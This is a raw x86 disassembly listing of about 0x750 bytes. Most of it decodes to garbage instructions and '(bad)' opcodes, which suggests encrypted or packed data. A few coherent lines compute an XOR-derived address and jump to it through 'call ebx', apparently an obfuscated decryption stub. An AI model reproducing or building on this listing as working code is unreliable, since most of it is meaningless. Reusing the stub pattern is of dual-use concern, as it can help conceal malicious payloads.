  40cb34:	test   BYTE PTR [edx-0x33],ch
  40cb37:	js     0x40cad4
  40cb39:	outs   dx,DWORD PTR ds:[esi]
  40cb3a:	and    ebx,DWORD PTR [edi+ebx*8-0x61]
  40cb3e:	mov    ds:0x532db9e5,eax
  40cb43:	ins    BYTE PTR es:[edi],dx
  40cb44:	pop    esi
  40cb45:	fwait
  40cb46:	mov    fs,WORD PTR [edx-0x6d]
  40cb49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb4a:	pusha  
  40cb4b:	xchg   edi,eax
  40cb4c:	xor    esp,DWORD PTR [ebx+ebp*8]
  40cb4f:	sub    DWORD PTR [eax-0x70],edi
  40cb52:	fmul   QWORD PTR ds:0xe3256b66
  40cb58:	mov    eax,edi
  40cb5a:	dec    edx
  40cb5b:	push   DWORD PTR [eax]
  40cb5d:	jne    0x40caf8
  40cb5f:	enter  0x6eec,0xe9
  40cb63:	pop    es
  40cb64:	jge    0x40cb0a
  40cb66:	mov    al,0xc6
  40cb68:	loopne 0x40cb7d
  40cb6a:	pop    ss
  40cb6b:	sti    
  40cb6c:	mov    esp,0xf6d04e15
  40cb71:	and    eax,0x7b00aaaa
  40cb76:	call   0xf1f6:0x9b623309
  40cb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb7e:	or     esi,DWORD PTR [edi]
  40cb80:	add    DWORD PTR [esi],eax
  40cb82:	icebp  
  40cb83:	cld    
  40cb84:	pusha  
  40cb85:	sub    eax,DWORD PTR [esi-0x2ce1f50]
  40cb8b:	shl    BYTE PTR [eax-0x30b862a7],0xeb
  40cb92:	cmp    BYTE PTR [eax-0x39fc96f3],bh
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x2c]
  40cbfc:	mov    ebx,0x8c62c62f
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	add    al,BYTE PTR [ebx]
  40cc09:	in     al,0x68
  40cc0b:	test   cl,ch
  40cc0d:	hlt    
  40cc0e:	adc    eax,0x52dcce82
  40cc13:	mov    edx,0x72e002cb
  40cc18:	fwait
  40cc19:	dec    ecx
  40cc1a:	jns    0x40cc01
  40cc1c:	adc    DWORD PTR [esi+0x67],esp
  40cc1f:	rcl    DWORD PTR [ebx+eax*2-0x80],0xe8
  40cc24:	nop
  40cc25:	mov    edi,0xb77aa3fa
  40cc2a:	icebp  
  40cc2b:	stos   BYTE PTR es:[edi],al
  40cc2c:	jge    0x40cc68
  40cc2e:	push   edi
  40cc2f:	aam    0x4a
  40cc31:	mov    ecx,0xc261b3d3
  40cc36:	or     ecx,edx
  40cc38:	scas   al,BYTE PTR es:[edi]
  40cc39:	jbe    0x40cbe1
  40cc3b:	pop    esp
  40cc3c:	xchg   BYTE PTR [esi+0x5b9a607],al
  40cc42:	mov    ebp,0xf4518272
  40cc47:	call   0x69e:0xae37ca28
  40cc4e:	push   es
  40cc4f:	sub    ch,BYTE PTR ds:0xbdc37ee9
  40cc55:	mov    eax,0xd139ef4c
  40cc5a:	enter  0x7dbb,0x8f
  40cc5e:	iret   
  40cc5f:	stc    
  40cc60:	stos   BYTE PTR es:[edi],al
  40cc61:	in     al,dx
  40cc62:	sbb    al,0xa3
  40cc64:	mov    eax,ds:0x60d8acf8
  40cc69:	cs dec esi
  40cc6b:	mov    al,ds:0x1b73aa
  40cc70:	xchg   ebp,eax
  40cc71:	jge    0x40cc4d
  40cc73:	lea    esp,[esp+esi*8]
  40cc76:	aad    0xcf
  40cc78:	ins    DWORD PTR es:[edi],dx
  40cc79:	shl    DWORD PTR [ecx+0x51],cl
  40cc7c:	scas   eax,DWORD PTR es:[edi]
  40cc7d:	outs   dx,BYTE PTR ds:[esi]
  40cc7e:	mov    ebx,0xe7be1e55
  40cc83:	mov    ecx,0x495c4d11
  40cc88:	cmp    ah,BYTE PTR [ecx+0x19]
  40cc8b:	lock scas al,BYTE PTR es:[edi]
  40cc8d:	inc    eax
  40cc8e:	xchg   edi,eax
  40cc8f:	or     BYTE PTR [edi+0x681dee65],0x7d
  40cc96:	mov    al,0x89
  40cc98:	ins    BYTE PTR es:[edi],dx
  40cc99:	shl    BYTE PTR [edi-0x74],1
  40cc9c:	retf   
  40cc9d:	adc    eax,0xa2eb4a63
  40cca2:	jg     0x40ccfd
  40cca4:	ret    
  40cca5:	jle    0x40ccb8
  40cca7:	mov    ah,0xfe
  40cca9:	std    
  40ccaa:	mov    ebp,0xc85818b6
  40ccaf:	cs leave 
  40ccb1:	adc    ch,BYTE PTR [ebx-0x2a]
  40ccb4:	call   0x2183a50b
  40ccb9:	popa   
  40ccba:	sbb    eax,0x4f1f5c62
  40ccbf:	inc    esi
  40ccc0:	pop    ecx
  40ccc1:	jmp    0xa5fcd4a4
  40ccc6:	adc    bl,dl
  40ccc8:	int3   
  40ccc9:	test   eax,0xb377166d
  40ccce:	sbb    al,0x2e
  40ccd0:	mov    WORD PTR [eax+0x68dd087f],es
  40ccd6:	add    al,0xd
  40ccd8:	adc    eax,0xe4884824
  40ccdd:	jp     0x40cd5d
  40ccdf:	stos   DWORD PTR es:[edi],eax
  40cce0:	in     eax,dx
  40cce1:	ins    DWORD PTR es:[edi],dx
  40cce2:	mov    eax,0x61a07c27
  40cce7:	jb     0x40cc9a
  40cce9:	pop    bp
  40cceb:	fcmovne st,st(4)
  40cced:	dec    edi
  40ccef:	aam    0x5f
  40ccf1:	fnstsw WORD PTR [eax]
  40ccf3:	inc    edi
  40ccf4:	mov    al,0x8
  40ccf6:	rcr    BYTE PTR [eax],1
  40ccf8:	rcl    dl,0x79
  40ccfb:	out    dx,al
  40ccfc:	imul   edi,ebp,0x71
  40ccff:	(bad)  
  40cd01:	sbb    edi,edx
  40cd03:	dec    ebp
  40cd04:	gs popf 
  40cd06:	sub    al,0xca
  40cd08:	sbb    BYTE PTR [ecx+edx*8+0x6e78c7c0],dl
  40cd0f:	mov    ecx,0xfc484e1f
  40cd14:	sahf   
  40cd15:	ds xchg ebx,eax
  40cd17:	dec    esp
  40cd18:	xchg   DWORD PTR [edx-0x5b],esi
  40cd1b:	ins    DWORD PTR es:[edi],dx
  40cd1c:	or     edi,DWORD PTR [ecx-0x75]
  40cd1f:	fcom   QWORD PTR [edx+0x31a5776e]
  40cd25:	push   ebp
  40cd26:	jno    0x40cca8
  40cd28:	(bad)  
  40cd29:	fidivr DWORD PTR [ecx-0x2c]
  40cd2c:	pop    edi
  40cd2d:	call   FWORD PTR [ebp-0x64]
  40cd30:	rol    DWORD PTR [ebp+0x7],0xcc
  40cd34:	sub    al,0xf
  40cd36:	leave  
  40cd37:	or     al,0xa5
  40cd39:	lods   eax,DWORD PTR ds:[esi]
  40cd3a:	loop   0x40ccfe
  40cd3c:	jne    0x40cd8c
  40cd3e:	jnp    0x40cd7d
  40cd40:	xchg   ecx,eax
  40cd41:	leave  
  40cd42:	mov    DWORD PTR [ecx+eax*4+0x4],ebp
  40cd46:	scas   eax,DWORD PTR es:[edi]
  40cd47:	ret    0x648a
  40cd4a:	fnsave [ecx]
  40cd4c:	into   
  40cd4d:	aad    0xbe
  40cd4f:	adc    dl,BYTE PTR [eax]
  40cd51:	fst    DWORD PTR [esi+0x55]
  40cd54:	xor    esp,DWORD PTR [ebx+0x0]
  40cd57:	loopne 0x40ccdb
  40cd59:	cwde   
  40cd5a:	pop    edi
  40cd5b:	push   cs
  40cd5c:	pop    es
  40cd5d:	sbb    eax,eax
  40cd5f:	inc    ecx
  40cd60:	mov    dh,0x32
  40cd62:	fsub   QWORD PTR [esi-0x74]
  40cd65:	push   esp
  40cd66:	adc    eax,0x52df61d2
  40cd6b:	outs   dx,BYTE PTR ds:[esi]
  40cd6c:	iret   
  40cd6d:	xchg   ecx,eax
  40cd6e:	dec    ebp
  40cd6f:	sbb    esi,DWORD PTR ds:0x47bfb9c9
  40cd75:	xchg   ebp,eax
  40cd76:	mov    edx,0x1e9af28d
  40cd7b:	retf   
  40cd7c:	cli    
  40cd7d:	or     ebx,DWORD PTR [ebp+0x28]
  40cd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd81:	out    dx,eax
  40cd82:	mov    ecx,0x2ad78f11
  40cd87:	sub    al,bh
  40cd89:	sbb    bl,BYTE PTR [edi-0x59830e12]
  40cd8f:	lods   al,BYTE PTR ds:[esi]
  40cd90:	pop    edi
  40cd91:	sbb    eax,DWORD PTR [edx-0x31b8dfed]
  40cd97:	in     eax,dx
  40cd98:	test   BYTE PTR [ebx],0x7c
  40cd9b:	and    DWORD PTR [ebx-0x8f67add],esp
  40cda1:	ds mov edx,ebx
  40cda4:	add    eax,0x538a5934
  40cda9:	sub    BYTE PTR [edx-0x3c],bl
  40cdac:	xchg   BYTE PTR [ecx],al
  40cdae:	mov    bh,0x54
  40cdb0:	and    dl,0x52
  40cdb3:	jnp    0x40cdd4
  40cdb5:	push   ebp
  40cdb6:	mov    dh,0x7a
  40cdb8:	out    dx,al
  40cdb9:	aaa    
  40cdba:	mov    dh,0x2e
  40cdbc:	loope  0x40cdb4
  40cdbe:	int    0xdb
  40cdc0:	jmp    0x40cd9c
  40cdc2:	sbb    al,0xc7
  40cdc4:	sub    bh,dh
  40cdc6:	jmp    0x40cdf8
  40cdc8:	cmp    ch,dh
  40cdca:	jmp    0xc15:0xc1912c5f
  40cdd1:	stc    
  40cdd2:	jmp    0x40cd75
  40cdd4:	iret   
  40cdd5:	or     DWORD PTR [edi+0x38],ebp
  40cdd8:	mov    WORD PTR [edx-0xc8d520d],?
  40cdde:	sbb    bh,cl
  40cde0:	jo     0x40ce45
  40cde2:	int3   
  40cde3:	jle    0x40cdca
  40cde5:	retf   
  40cde6:	xor    edi,edi
  40cde8:	cmp    BYTE PTR [esi+0x1a0505b4],0x7d
  40cdef:	fcomip st,st(2)
  40cdf1:	cld    
  40cdf2:	push   ss
  40cdf3:	mov    edi,0xdcffb825
  40cdf8:	mov    bl,0x36
  40cdfa:	sbb    ebp,edi
  40cdfc:	test   BYTE PTR [ebp-0x545c6fb9],ah
  40ce02:	xchg   edx,eax
  40ce03:	ds (bad) 
  40ce05:	icebp  
  40ce06:	cmp    al,0x2a
  40ce08:	push   cs
  40ce09:	out    0xf2,al
  40ce0b:	jbe    0x40cdd6
  40ce0d:	add    BYTE PTR [esi+0x2d],ch
  40ce10:	inc    ecx
  40ce11:	pop    ds
  40ce12:	loopne 0x40cdd5
  40ce14:	imul   esi,esi,0x74287be3
  40ce1a:	push   ss
  40ce1b:	shl    DWORD PTR [esi-0x7c],cl
  40ce1e:	scas   al,BYTE PTR es:[edi]
  40ce1f:	lahf   
  40ce20:	das    
  40ce21:	push   eax
  40ce22:	repz pop edi
  40ce24:	jge    0x40ce5b
  40ce26:	push   0xffffff87
  40ce28:	sub    eax,DWORD PTR [ebx+edi*4+0x4c86c644]
  40ce2f:	sbb    BYTE PTR [edi-0x19],0xd4
  40ce33:	mov    ah,0xe7
  40ce35:	or     eax,0xbd33a02b
  40ce3a:	ficom  DWORD PTR [ecx-0x3c]
  40ce3d:	sbb    BYTE PTR [ebx-0x467b664d],0x75
  40ce44:	lods   al,BYTE PTR ds:[esi]
  40ce45:	in     al,dx
  40ce46:	and    al,0x91
  40ce48:	cdq    
  40ce49:	sub    eax,0x2bc4899b
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	adc    eax,0x2c89a21c
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	test   DWORD PTR [edi+0x2a3c403c],eax
  40ce74:	adc    dl,dh
  40ce76:	js     0x40cef6
  40ce78:	stc    
  40ce79:	mov    DWORD PTR [esi],edi
  40ce7b:	out    0x4d,eax
  40ce7d:	ds ret 
  40ce7f:	outs   dx,DWORD PTR ds:[esi]
  40ce80:	cld    
  40ce81:	xchg   BYTE PTR [esi-0x6c],bh
  40ce84:	jbe    0x40ce15
  40ce86:	out    0x2d,al
  40ce88:	inc    eax
  40ce89:	add    eax,ecx
  40ce8b:	out    0xb5,eax
  40ce8d:	mov    ebx,0x21f00666
  40ce92:	icebp  
  40ce93:	xchg   ebp,eax
  40ce94:	cmc    
  40ce95:	nop
  40ce96:	fadd   st,st(4)
  40ce98:	mov    dh,0x1e
  40ce9a:	pop    esi
  40ce9b:	sub    DWORD PTR [ebx],0xacbf2199
  40cea1:	je     0x40ceb1
  40cea3:	cdq    
  40cea4:	ins    BYTE PTR es:[edi],dx
  40cea5:	loope  0x40ce4f
  40cea7:	sbb    DWORD PTR [edx+0x7e],esi
  40ceaa:	repz in al,dx
  40ceac:	mov    es,WORD PTR [ebp+0x27]
  40ceaf:	mov    gs,WORD PTR gs:[eax]
  40ceb2:	jnp    0x40cf26
  40ceb4:	mov    DWORD PTR [ebp-0x7d969c9],edi
  40ceba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cebb:	js     0x40cf17
  40cebd:	jge    0x40cf19
  40cebf:	es int3 
  40cec1:	test   DWORD PTR [esp+eax*8-0x37e22442],0x9b0111d
  40cecc:	mov    al,0xed
  40cece:	retf   0x9651
  40ced1:	mov    bh,0x57
  40ced3:	xchg   esp,eax
  40ced4:	add    cl,bh
  40ced6:	add    bh,BYTE PTR [edi+0xa]
  40ced9:	enter  0xa3b3,0x2a
  40cedd:	push   edx
  40cede:	je     0x40ce88
  40cee0:	xor    al,0x4c
  40cee2:	jle    0x40ce8e
  40cee4:	xchg   esp,eax
  40cee5:	not    DWORD PTR [ebx+0x4]
  40cee8:	jmp    0x8aad9902
  40ceed:	gs inc ebp
  40ceef:	push   ss
  40cef0:	cwde   
  40cef1:	std    
  40cef2:	inc    edx
  40cef3:	stos   DWORD PTR es:[edi],eax
  40cef4:	shl    BYTE PTR [esi-0x44],cl
  40cef7:	jg     0x40cedd
  40cef9:	pop    edx
  40cefa:	xchg   edx,eax
  40cefb:	bound  ecx,QWORD PTR [eax+0x2aeb64b2]
  40cf01:	test   BYTE PTR [ecx],dl
  40cf03:	sar    esp,cl
  40cf05:	cmc    
  40cf06:	push   0x3002194b
  40cf0b:	push   ecx
  40cf0c:	popa   
  40cf0d:	pop    eax
  40cf0e:	je     0x40cf15
  40cf10:	adc    BYTE PTR [esi],dh
  40cf12:	jo     0x40cf20
  40cf14:	add    edx,DWORD PTR [ecx+0xe]
  40cf17:	inc    ebx
  40cf18:	fs addr16 pop es
  40cf1b:	je     0x40ceb8
  40cf1d:	mov    ah,0x95
  40cf1f:	stc    
  40cf20:	popf   
  40cf21:	(bad)  
  40cf22:	int3   
  40cf23:	test   eax,0xa9e01140
  40cf28:	pop    eax
  40cf29:	mov    ecx,0xf3b829d
  40cf2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf2f:	xchg   dh,ah
  40cf31:	(bad)  
  40cf32:	loop   0x40cf1f
  40cf34:	cmc    
  40cf35:	adc    ah,BYTE PTR [ebp+0x72a224eb]
  40cf3b:	adc    edx,DWORD PTR [eax+ebx*2-0x44]
  40cf3f:	sub    al,0x53
  40cf41:	adc    ecx,eax
  40cf43:	xor    eax,0x992a3f54
  40cf48:	and    edx,DWORD PTR [edi+esi*4-0x45ad3215]
  40cf4f:	(bad)  
  40cf50:	scas   eax,DWORD PTR es:[edi]
  40cf51:	aas    
  40cf52:	pusha  
  40cf53:	xchg   edx,eax
  40cf54:	mov    ah,0x54
  40cf56:	call   FWORD PTR [ecx-0x55]
  40cf59:	pop    ebp
  40cf5a:	xor    BYTE PTR [eax],bh
  40cf5c:	mov    eax,ds:0x5fccb2ba
  40cf61:	push   esi
  40cf62:	add    edi,DWORD PTR [ebx+ebx*2]
  40cf65:	inc    eax
  40cf66:	inc    esi
  40cf67:	add    BYTE PTR [edi-0x2e],bl
  40cf6a:	(bad)  [edi]
  40cf6c:	or     al,0xf
  40cf6e:	in     eax,dx
  40cf6f:	mov    ebp,0x9c403821
  40cf74:	fist   DWORD PTR [eax-0xd]
  40cf77:	call   0x490a:0xeed8b02e
  40cf7e:	fimul  WORD PTR [edx+0x7d97055f]
  40cf84:	mov    dl,0xb2
  40cf86:	loopne 0x40cf5a
  40cf88:	fs push ebx
  40cf8a:	jnp    0x40d003
  40cf8c:	push   esi
  40cf8d:	dec    edx
  40cf8e:	mov    bh,0x19
  40cf90:	xchg   ecx,eax
  40cf91:	inc    edi
  40cf92:	or     al,0xd4
  40cf94:	stos   BYTE PTR es:[edi],al
  40cf95:	or     ecx,DWORD PTR [ebx+eiz*8+0x62]
  40cf99:	loope  0x40d001
  40cf9b:	add    ch,BYTE PTR [esp+0x61]
  40cf9f:	xchg   ebx,eax
  40cfa0:	mov    al,cl
  40cfa2:	xor    DWORD PTR [ebx+esi*2-0x64],ebp
  40cfa6:	fdiv   QWORD PTR [edi+0x14]
  40cfa9:	mov    al,BYTE PTR [eax+eax*4-0x51]
  40cfad:	shr    BYTE PTR [esi+0x5a],0x72
  40cfb1:	or     BYTE PTR [ebx+ebx*4],ch
  40cfb4:	(bad)  
  40cfb5:	icebp  
  40cfb6:	in     al,dx
  40cfb7:	enterw 0xa4c,0xde
  40cfbc:	sub    eax,0xa0e346d1
  40cfc1:	int3   
  40cfc2:	leave  
  40cfc3:	mov    ch,0xcb
  40cfc5:	jne    0x40cffe
  40cfc7:	mov    al,ds:0x4577707b
  40cfcc:	xlat   BYTE PTR ds:[ebx]
  40cfcd:	test   BYTE PTR [ecx+edx*8-0x78aa147c],cl
  40cfd4:	mov    bh,0xca
  40cfd6:	jno    0x40cf58
  40cfd8:	add    BYTE PTR ss:[ebp-0x1d46f6e4],bh
  40cfdf:	xchg   ebx,eax
  40cfe0:	pop    ebx
  40cfe1:	ins    BYTE PTR es:[edi],dx
  40cfe2:	sti    
  40cfe3:	scas   eax,DWORD PTR es:[edi]
  40cfe4:	in     al,dx
  40cfe5:	fcomp  DWORD PTR [ebp+0x63]
  40cfe8:	or     al,0xe5
  40cfea:	sti    
  40cfeb:	pop    edi
  40cfec:	popf   
  40cfed:	test   eax,0x9caa8afd
  40cff2:	jne    0x40cf7e
  40cff4:	in     al,dx
  40cff5:	mov    BYTE PTR [edx+0x72],bl
  40cff8:	or     BYTE PTR [esi],al
  40cffa:	cmove  ebx,DWORD PTR [edx-0x6a331498]
  40d001:	inc    ebx
  40d002:	dec    ecx
  40d003:	repnz scas al,BYTE PTR es:[edi]
  40d005:	push   0xffffff98
  40d007:	rcr    DWORD PTR [eax+0x18],1
  40d00a:	mov    esi,0x69452205
  40d00f:	xor    DWORD PTR [eax-0x17551270],ebx
  40d015:	sub    DWORD PTR [ebx+0x28],eax
  40d018:	push   esp
  40d019:	sahf   
  40d01a:	add    eax,DWORD PTR [edx*1+0x61e29799]
  40d021:	inc    ebp
  40d022:	dec    ecx
  40d023:	sub    al,0x36
  40d025:	dec    edx
  40d026:	lds    ebx,FWORD PTR [esi]
  40d028:	aad    0x30
  40d02a:	pop    ebx
  40d02b:	adc    DWORD PTR ds:0x2dfb49f6,edi
  40d031:	fwait
  40d032:	dec    esi
  40d033:	popa   
  40d034:	inc    edi
  40d035:	sbb    eax,0x7cc0a786
  40d03a:	mov    ebx,0x292ace89
  40d03f:	sti    
  40d040:	lock jb 0x40d051
  40d043:	add    al,ah
  40d045:	add    esp,DWORD PTR ds:0x42e7c02e
  40d04b:	sbb    cl,ah
  40d04d:	sbb    BYTE PTR [eax],dl
  40d04f:	cmp    edx,DWORD PTR [ebp-0x356aabd7]
  40d055:	enter  0xd6a,0xa3
  40d059:	pop    ds
  40d05a:	ins    DWORD PTR es:[edi],dx
  40d05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d05c:	and    eax,0x2c9f91f3
  40d061:	jne    0x40d028
  40d063:	mov    cl,0x12
  40d065:	add    ebx,DWORD PTR [ebp+0x7f]
  40d068:	xchg   ebx,eax
  40d069:	jo     0x40d090
  40d06b:	pop    ecx
  40d06c:	out    dx,eax
  40d06d:	add    ebx,DWORD PTR [ecx]
  40d06f:	cmp    BYTE PTR [edx+eax*2],bh
  40d072:	inc    esi
  40d073:	fcmovb st,st(3)
  40d075:	mov    eax,ds:0x25b2ddf6
  40d07a:	push   esp
  40d07b:	mov    eax,ds:0xc5eb74f
  40d080:	xchg   ebx,eax
  40d082:	mov    al,0x77
  40d084:	imul   edi,DWORD PTR [edx+0x26],0x624e35f9
  40d08b:	dec    edi
  40d08c:	in     al,dx
  40d08d:	in     eax,dx
  40d08e:	mov    ebx,0x55f73b6e
  40d093:	scas   eax,DWORD PTR es:[edi]
  40d094:	jnp    0x40d06a
  40d096:	pop    ebp
  40d097:	push   ebp
  40d098:	jmp    0x40d0bb
  40d09a:	xlat   BYTE PTR ds:[ebx]
  40d09b:	int    0xd1
  40d09d:	cmp    eax,0xdffe8f30
  40d0a2:	xor    BYTE PTR [esp+eax*2+0x61],ch
  40d0a6:	icebp  
  40d0a7:	jmp    0xb8a4:0xd3b8de97
  40d0ae:	mov    esi,0x2e453380
  40d0b3:	cwde   
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	(bad)  
  40d0d0:	mov    cl,0xf
  40d0d2:	cld    
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0c5
  40d0dc:	push   0xb47c29c2
  40d0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0e2:	daa    
  40d0e3:	and    eax,0xe7ecf2e
  40d0e8:	sbb    eax,0xf97a7433
  40d0ed:	iret   
  40d0ee:	js     0x40d127
  40d0f0:	les    eax,FWORD PTR [edx+0x5d33586a]
  40d0f6:	mov    al,0xae
  40d0f8:	out    0xee,al
  40d0fa:	add    DWORD PTR [edi+ebp*2+0x77],ebp
  40d0fe:	jecxz  0x40d0aa
  40d100:	out    dx,eax
  40d101:	sub    DWORD PTR [ebx],ecx
  40d103:	xor    dh,0x86
  40d106:	pop    ebx
  40d107:	mov    ebp,0xb9505624
  40d10c:	mov    ah,0x5
  40d10e:	dec    esp
  40d10f:	sub    BYTE PTR [ecx+0x694ba819],ch
  40d115:	dec    edx
  40d116:	xchg   DWORD PTR [eax],edi
  40d118:	and    eax,0x75752d3e
  40d11d:	aas    
  40d11e:	xchg   DWORD PTR [edi+0x4e],ebp
  40d121:	fwait
  40d122:	test   al,0xac
  40d124:	mov    ebx,0x9cc88573
  40d129:	inc    eax
  40d12a:	jb     0x40d166
  40d12c:	inc    ebx
  40d12d:	push   esi
  40d12e:	jo     0x40d16b
  40d130:	mov    ecx,0x7c9b94f3
  40d135:	fiadd  WORD PTR ds:0x67e92f94
  40d13b:	push   ecx
  40d13c:	hlt    
  40d13d:	add    al,0x3e
  40d13f:	fisttp WORD PTR [edi+0x52]
  40d142:	in     al,0xf8
  40d144:	xor    DWORD PTR [ebp+0x63e0800e],ecx
  40d14a:	adc    DWORD PTR [ebp+0x273df362],esp
  40d150:	xchg   esp,eax
  40d151:	push   cs
  40d152:	ss cmp al,0x19
  40d155:	jp     0x40d16b
  40d157:	push   ss
  40d158:	fld    QWORD PTR [eax]
  40d15a:	xchg   edi,eax
  40d15b:	or     al,al
  40d15d:	inc    edx
  40d15e:	adc    eax,0x4c7b4a1
  40d163:	call   0xa60b:0xd8314605
  40d16a:	cs xchg ebx,eax
  40d16c:	xor    al,0x21
  40d16e:	pop    eax
  40d16f:	out    0x33,eax
  40d171:	je     0x40d171
  40d173:	std    
  40d174:	(bad)  
  40d176:	(bad)  
  40d177:	cmp    DWORD PTR ds:[ecx-0xc9c5403],edx
  40d17e:	lahf   
  40d17f:	adc    esp,edi
  40d181:	rol    DWORD PTR [eax+ebx*4+0x73209fe],cl
  40d188:	cdq    
  40d189:	int3   
  40d18a:	jae    0x40d151
  40d18c:	xchg   esp,eax
  40d18d:	pushf  
  40d18e:	je     0x40d1f1
  40d190:	and    BYTE PTR [eax],ah
  40d192:	push   edx
  40d193:	or     dh,BYTE PTR [edi]
  40d195:	mov    dl,0x34
  40d197:	jno    0x40d203
  40d199:	scas   al,BYTE PTR es:[edi]
  40d19a:	mov    ah,0xa8
  40d19c:	sub    BYTE PTR [eax-0x61811c50],ch
  40d1a2:	dec    edi
  40d1a3:	dec    edi
  40d1a4:	mov    eax,ds:0x58256a57
  40d1a9:	ins    DWORD PTR es:[edi],dx
  40d1aa:	cmp    BYTE PTR [esi+0x26],bh
  40d1ad:	push   es
  40d1ae:	mov    ds:0x55e3b5e7,al
  40d1b3:	and    DWORD PTR [edx],esi
  40d1b5:	cmp    BYTE PTR [eax-0x4a5a6352],0x16
  40d1bc:	lea    ebp,[eax+0x25]
  40d1bf:	or     BYTE PTR [edi+0x4efd5e19],0x7a
  40d1c6:	jnp    0x40d1ad
  40d1c8:	jae    0x40d1a7
  40d1ca:	pop    eax
  40d1cb:	addr16 mov eax,0xf7d0ac69
  40d1d1:	leave  
  40d1d2:	aam    0x65
  40d1d4:	mov    cl,0x99
  40d1d6:	add    esi,DWORD PTR ds:0x8edc6efa
  40d1dc:	push   edi
  40d1dd:	add    DWORD PTR [edi],esp
  40d1df:	addr16 and al,0x69
  40d1e2:	out    dx,eax
  40d1e3:	les    ebx,FWORD PTR [ebx+ebp*8-0x77a28c2b]
  40d1ea:	push   ebx
  40d1eb:	sub    al,0x1e
  40d1ed:	addr16 test al,0xd0
  40d1f0:	sub    ebp,0xffffffe5
  40d1f3:	inc    ebp
  40d1f4:	pop    DWORD PTR [ebx-0x74]
  40d1f7:	bound  eax,QWORD PTR [ebp-0x49]
  40d1fa:	ds shr bh,0x4a
  40d1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ff:	scas   al,BYTE PTR es:[edi]
  40d200:	xor    esi,DWORD PTR [esi+0x71f6d66f]
  40d206:	call   0x4820:0xdd090afa
  40d20d:	js     0x40d1a8
  40d20f:	sbb    bl,BYTE PTR [ebx]
  40d211:	pop    ebx
  40d212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d213:	dec    ebp
  40d214:	out    0xe1,al
  40d216:	call   0x7d3b9c2f
  40d21b:	js     0x40d299
  40d21d:	ja     0x40d1b0
  40d21f:	loopne 0x40d1ab
  40d221:	les    eax,FWORD PTR [edx]
  40d223:	test   al,0x5
  40d225:	sbb    ebx,0xaf4d02df
  40d22b:	adc    ch,dh
  40d22d:	loop   0x40d1af
  40d22f:	repnz add DWORD PTR [ebp+0x24],edi
  40d233:	scas   eax,DWORD PTR es:[edi]
  40d234:	stc    
  40d235:	or     eax,0x72d3bf5a
  40d23a:	es sti 
  40d23c:	daa    
  40d23d:	xchg   ebp,eax
  40d23e:	mov    bl,0x34
  40d240:	aaa    
  40d241:	outs   dx,DWORD PTR ds:[esi]
  40d242:	mov    gs,WORD PTR [ebx-0x348f0591]
  40d248:	shl    BYTE PTR [esi],0xec
  40d24b:	popf   
  40d24c:	ror    BYTE PTR [ecx],0x1
  40d24f:	nop
  40d250:	retf   
  40d251:	ins    BYTE PTR es:[edi],dx
  40d252:	jo     0x40d282
  40d254:	icebp  
  40d255:	pushf  
  40d256:	pop    ecx
  40d257:	(bad)  
  40d258:	out    dx,al
  40d259:	dec    ebx
  40d25a:	cld    
  40d25b:	mov    ecx,0x25628e9d
  40d260:	jo     0x40d2cb
  40d262:	call   0xfc676fcb
  40d267:	fcomp  DWORD PTR [edx+eiz*8-0x451d7a7d]
  40d26e:	sahf   
  40d26f:	dec    eax
  40d270:	sub    al,0x94
  40d272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d273:	test   eax,0xbf478fec
  40d278:	sub    al,0xc0
  40d27a:	mov    cs,WORD PTR [edx]
  40d27c:	mov    ah,0xbd
